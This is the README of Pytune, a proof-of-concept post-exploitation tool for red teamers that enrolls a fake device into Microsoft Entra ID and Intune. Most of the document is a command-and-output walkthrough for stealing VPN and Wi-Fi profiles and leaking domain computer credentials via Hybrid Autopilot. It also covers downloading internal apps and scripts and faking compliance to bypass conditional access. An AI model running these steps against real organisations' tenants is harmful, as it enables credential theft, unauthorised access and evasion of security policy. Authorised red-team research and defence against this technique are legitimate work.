
# Pytune

Pytune is a post-exploitation tool for enrolling a fake device into Intune with mulitple platform support.

https://www.blackhat.com/eu-24/briefings/schedule/index.html#unveiling-the-power-of-intune-leveraging-intune-for-breaking-into-your-cloud-and-on-premise-42176

Note that this is a proof of concept tool. The tool is provided as is, without warranty of any kind.

Supported OSs are as follows:

- Windows
- Android
- Linux

This tools gives red teamers following advantages;

- Enroll a fake device to Entra ID and Intune
- Steal device configurations such as VPN, and Wi-Fi
- Leak domain computer credentials if hybrid autopilot is enabled
- Download installer files for lin-of-business apps, powershell scritps and custom Win32 apps (.bat, .exe ...etc)
- Bypass Entra ID Conditional Access policy of "Marked as Compliant"
- Clean up

## Usage

```
$ python3 pytune.py -h
usage: pytune.py [-h] [-x PROXY] [-v] {entra_join,entra_delete,enroll_intune,checkin,retire_intune,check_compliant,download_apps,get_remediations} ...

 ______   __  __     ______   __  __     __   __     ______    
/\  == \ /\ \_\ \   /\__  _\ /\ \/\ \   /\ "-.\ \   /\  ___\   
\ \  _-/ \ \____ \  \/_/\ \/ \ \ \_\ \  \ \ \-.  \  \ \  __\   
 \ \_\    \/\_____\    \ \_\  \ \_____\  \ \_\\"\_\  \ \_____\ 
  \/_/     \/_____/     \/_/   \/_____/   \/_/ \/_/   \/_____/ 
                                                               
      Faking a device to Microsft Intune (version:1.2)


options:
  -h, --help            show this help message and exit

subcommands:
  pytune commands

  {entra_join,entra_delete,enroll_intune,checkin,retire_intune,check_compliant,download_apps,get_remediations}
    entra_join          join device to Entra ID
    entra_delete        delete device from Entra ID
    enroll_intune       enroll device to Intune
    checkin             checkin to Intune
    retire_intune       retire device from Intune
    check_compliant     check compliant status
    download_apps       download available win32apps and scripts (only Windows supported since I'm lazy)
    get_remediations    download available remediation scripts (only Windows supported since I'm lazy)
```

### Enroll a fake device

To enroll a fake device to Intune, you need to register it to Entra ID first with `entra_join` command.

```
$ python3 pytune.py entra_join -o Windows -d Windows_pytune -u testuser@*******.onmicrosoft.com -p ***********                          
Saving private key to Windows_pytune_key.pem
Registering device
Device ID: 8fd0710a-1ea3-4261-86d1-48d7509c80b8
Saved device certificate to Windows_pytune_cert.pem
[+] successfully registered Windows_pytune to Entra ID!
[*] here is your device certificate: Windows_pytune.pfx (pw: password)
```

You will receive an Entra ID's device certificate when succeded.

Then, you can enroll the fake device to Intune with `enroll_intune` command.

```
$  python3 pytune.py enroll_intune -o Windows -d Windows_pytune -c Windows_pytune.pfx -u testuser@*******.onmicrosoft.com -p *********** 
[*] resolved enrollment url: https://fef.msuc06.manage.microsoft.com/StatelessEnrollmentService/DeviceEnrollment.svc
[+] successfully enrolled Windows_pytune to Intune!
[*] here is your MDM pfx: Windows_pytune_mdm.pfx (pw: password)
```

Intune MDM device ceritificate, `{device_name}_mdm.pfx`, is generated once the device is enrolled to Intune.

### Steal device configuration

You can start check-in with `checkin` command.
This exchanges information between device and Intune management server.

```
$ python3 pytune.py checkin -o Windows -d Windows_pytune -c Windows_pytune.pfx -m Windows_pytune_mdm.pfx -u testuser@*******.onmicrosoft.com -p ***********
[*] send request #1
 [*] sending data for ./Vendor/MSFT/NodeCache/MS%20DM%20Server
 [*] sending data for ./Vendor/MSFT/NodeCache/MS%20DM%20Server/CacheVersion
 [*] sending data for ./Vendor/MSFT/NodeCache/MS%20DM%20Server/ChangedNodes
 [*] sending data for ./DevDetail/SwV
 [*] sending data for ./DevDetail/Ext/Microsoft/LocalTime
 [*] sending data for ./Vendor/MSFT/WindowsLicensing/Edition
 [*] sending data for ./Vendor/MSFT/Update/LastSuccessfulScanTime
...
```

If there are any device configuration profiles, pytune will steal and display them. The followings are the examples of VPN and Wi-Fi settings delivered to the fake device.

```
[*] send request #9
[*] checkin ended!
[!] maybe these are configuration profiles:
- ./Device/Vendor/MSFT/VPNv2/Contoso%20VPN/RememberCredentials: false
- ./Device/Vendor/MSFT/VPNv2/Contoso%20VPN/AlwaysOn: false
- ./Device/Vendor/MSFT/VPNv2/Contoso%20VPN/RegisterDns: false
- ./Device/Vendor/MSFT/VPNv2/Contoso%20VPN/DeviceCompliance/Enabled: false
- ./Device/Vendor/MSFT/VPNv2/Contoso%20VPN/DeviceCompliance/Sso/Enabled: false
- ./Device/Vendor/MSFT/VPNv2/Contoso%20VPN/PluginProfile/ServerUrlList: vpn.contoso.com;Internal VPN
- ./Device/Vendor/MSFT/VPNv2/Contoso%20VPN/PluginProfile/CustomConfiguration: <pulse-schema><isSingleSignOnCredential>true</isSingleSignOnCredential></pulse-schema>
- ./Device/Vendor/MSFT/VPNv2/Contoso%20VPN/PluginProfile/PluginPackageFamilyName: 951D7986.PulseSecureVPN_qzpvqh70t9a4p
- ./Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/Poll/PollOnLogin: true
- ./cimv2/MDM_ConfigSetting/MDM_ConfigSetting.SettingName=%22AccountId%22/SettingValue: 3decc354-7c51-4c78-9f40-7eb57efbe447
- ./Vendor/MSFT/WiFi/Profile/ContosoCorp_Wi-Fi/WlanXml:
{'WLANProfile': {'@xmlns': 'http://www.microsoft.com/networking/WLAN/profile/v1', 'name': 'ContosoCorp_Wi-Fi', 'SSIDConfig': {'SSID': {'hex': '436F6E746F736F436F72705F57692D4669', 'name': 'ContosoCorp_Wi-Fi'}, 'nonBroadcast': 'false'}, 'connectionType': 'ESS', 'connectionMode': 'auto', 'autoSwitch': 'false', 'MSM': {'security': {'authEncryption': {'authentication': 'WPA2PSK', 'encryption': 'AES', 'useOneX': 'false', 'FIPSMode': {'@xmlns': 'http://www.microsoft.com/networking/WLAN/profile/v2', '#text': 'false'}}, 'sharedKey': {'keyType': 'passPhrase', 'protected': 'false', 'keyMaterial': 'SuperSecretWiFiPassword'}, 'PMKCacheMode': 'disabled'}}}}
- ./Vendor/MSFT/WiFi/Profile/ContosoCorp_Wi-Fi/WiFiCost: 1
- ./Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/Push/PFN: 15494WindowsStoreWNS.WNSIntune_skcpvdt8tnyse
```

Also, if any installer files for line-of-business apps are configured to be delivered, `checkin` command will download it as follows.

```
[!] we found line-of-business app...
[*] downloading msi file from https://fef.msuc06.manage.microsoft.com/ContentService/DownloadService/GetAppActive/WinRT?contentGuid=22cce2e1-e62d-4142-b7cb-c8750cd57dda&fileNameHash=45d9c902-8d79-417a-8414-4b21948011dd.msi.bin&api-version=1.0
[+] successfully downloaded to 45d9c902-8d79-417a-8414-4b21948011dd.msi
```

This could be a VPN client installer file that can be used for initial access.

### Query compliance state of your device

The device's compliance state is evaluated through the information sent to Intune during the check-in.
`check_compliant` command queies the compliance state of the fake device and tell you which settings are not compliant with the company's policy

```
$ python3 pytune.py check_compliant -c Windows_pytune.pfx -u testuser@*******.onmicrosoft.com -p ***********                                    
[*] resolved IWservice url: https://fef.msuc06.manage.microsoft.com/TrafficGateway/TrafficRoutingService/IWService/StatelessIWService
[*] resolved token renewal url: https://fef.msuc06.manage.microsoft.com/OAuth/StatelessOAuthService/OAuthProxy/
[-] Windows_pytune is not compliant
[!] non-compliant reason #1:
 - SettingID: Firewall_Enabled
 - Title: Device must have firewall enabled.
 - Description: This device must have the firewall enabled. Contact your IT administrator for help.
[!] non-compliant reason #2:
 - SettingID: SpecificationVersionForCompliance
 - Title: A Trusted Platform Module (TPM) is required
 - ExpectedValue: Equals True
 - Description: This device does not have an active TPM present.
```

You can modify what settings are sent as a fake device, for example, in `device/windows.py`.
Then, re-enroll and check-in again so that you can get a fake device being marked as compliant.

### Leak domain computer credentials

When Hybrid Autopilot is configured, you can leak a domain computer's credential for initial access.
To enroll a fake device as AutoPilot, you need to get a hardware hash from your test machine.

As for the hardware hash retrieval, you can referer to the following page.

https://learn.microsoft.com/en-us/autopilot/add-devices#powershell

Then, you can provide the hardware hash in `-H` parameter in `checkin` command.

```
$ python3 pytune.py checkin -o Windows -d Windows_pytune -c Windows_pytune.pfx -m Windows_pytune_mdm.pfx  -u testuser@*******.onmicrosoft.com -p *********** -H $HWHASH
```

Then, after the initial check-in with the hardware hash, the next check-in will give you the domain credential.

```
[+] got online domain join blob
[*] parse domain join info...
 - domain: vuln.local
 - computername: DESKTOP-PZjn0P9$
 - computerpass: _`@#"%zsw^W***********************************************
```

### Download Win32 apps and PowerShell scripts

If there are Win32 apps or PowerShell scripts to be delviered, you can donwload it through `download_apps` command.
Here is the example of the command.

```
$ python3 pytune.py download_apps-m Windows_pytune_mdm.pfx                                                                            
[*] downloading scripts...
[!] scripts found!
[*] #1 (policyid:f7e2c3b6-b57f-43fb-a17f-2feab218806b):

$userName = "pcadmin"
$password = "SuperSecurePassword" 
$securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force

New-LocalUser -Name $userName -Password $securePassword -FullName "Local Administrator" -Description "Local Admin User" -PasswordNeverExpires
Add-LocalGroupMember -Group "Administrators" -Member $userName

[*] downloading win32apps...
[!] found ContosoCorpCustomApp!
[*] downloading from http://swdc01-mscdn.manage.microsoft.com/3decc354-7c51-4c78-9f40-7eb57efbe447/6505c9ee-4847-4d5c-a7bb-aa99ec92d674/4ad4d2b8-9210-4496-ad12-11f48d255119.intunewin.bin ...
[+] successfully downloaded to ContosoCorpCustomApp.intunewin!
[!] found DomainJoin.bat!
[*] downloading from http://swdc02-mscdn.manage.microsoft.com/3decc354-7c51-4c78-9f40-7eb57efbe447/f7131f16-29ef-415d-b549-ea706cba6da0/e9c4f14e-9d76-4797-a697-7139d64c8975.intunewin.bin ...
[+] successfully downloaded to DomainJoin.bat.intunewin!
```

When successful, PowerShell scripts are displayed and also .intunewin files are downloaded.

.intunewin file is just a zip file and you can unzip it to extract the Win32 apps inside. 

### Clean-up

For clean-up, retire the fake device from Intune.

First, you need to execute `retire_intune` command.

```
$ python3 pytune.py retire_intune -o Windows -c Windows_pytune.pfx -u testuser@*******.onmicrosoft.com -p ***********
[*] resolved IWservice url: https://fef.msuc06.manage.microsoft.com/TrafficGateway/TrafficRoutingService/IWService/StatelessIWService
[*] resolved token renewal url: https://fef.msuc06.manage.microsoft.com/OAuth/StatelessOAuthService/OAuthProxy/
[*] resolved reitrement url: https://fef.msuc06.manage.microsoft.com/TrafficGateway/TrafficRoutingService/IWService/StatelessIWService/Devices(guid'cabd6f8f-a88f-42e7-b3d0-6b93efb41657')/FullWipe
[+] successfully retired: 8fd0710a-1ea3-4261-86d1-48d7509c80b8
```

To complete retirement, you need to check-in again. This will delete the fake device object from Intune.

```
$ python3 pytune.py checkin -o Windows -d Windows_pytune -c Windows_pytune.pfx -m Windows_pytune_mdm.pfx -u testuser@*******.onmicrosoft.com -p ***********
[*] send request #1
[*] send request #2
 [*] sending data for ./Vendor/MSFT/DMClient/Provider/MS%20DM%20Server/EntDMID
[*] send request #3
[*] checkin ended!
```

Additionally, you need to delete the device in Entra ID as well with `entra_delete` command.

```
$ python3 pytune.py entra_delete -c Windows_pytune.pfx                                                                                                   
Device was deleted in Azure AD
```

If the device is enrolled as an AutoPilot device, then it fails to delete the device object from Entra ID.
Delete the device information in Microsoft Intune admin center > Windows > Enrollment > Devices before `entra_delete` command.

## Note

### Enrollment restrictions

There are some cases where you encounter several types of enrollment restrictions. When you run enroll_intune command with `-v` option, you will see the detailed error response from Intune.

Here are the examples of the error response.

- failed to enroll Android device because the target tenant might not be connected to Google Play account to manage Android enterprise devices (there might be other cases where you meet this error response)

```xml
$ python3 pytune.py -v enroll_intune -o Android -f .roadtools_auth -c Android_pytune.pfx -d Android_pytune 
[*] resolved enrollment url: https://fef.msuc06.manage.microsoft.com/StatelessEnrollmentService/DeviceEnrollment.svc
[*] enrolling device to Intune...
[*] received response for enrollment request:

<s:Envelope
	xmlns:s="http://www.w3.org/2003/05/soap-envelope"
	xmlns:a="http://www.w3.org/2005/08/addressing">
	<s:Body>
		<s:Fault>
			<s:Code>
				<s:Value>s:Receiver</s:Value>
				<s:Subcode>
					<s:Value>s:Authorization</s:Value>
				</s:Subcode>
			</s:Code>
			<s:Reason>
				<s:Text xml:lang="en-US">AFW Put User: Account not onboarded to Android Enterprise</s:Text>
			</s:Reason>
			<s:Detail>
				<DeviceEnrollmentServiceError
					xmlns="http://schemas.microsoft.com/windows/pki/2009/01/enrollment">
					<ErrorType>Authorization</ErrorType>
					<Message>AFW Put User: Account not onboarded to Android 
Enterprise</Message>
					<TraceId>192f66b8-c7eb-424f-8ead-175aa17c5250</TraceId>
				</DeviceEnrollmentServiceError>
			</s:Detail>
		</s:Fault>
	</s:Body>
</s:Envelope>
```

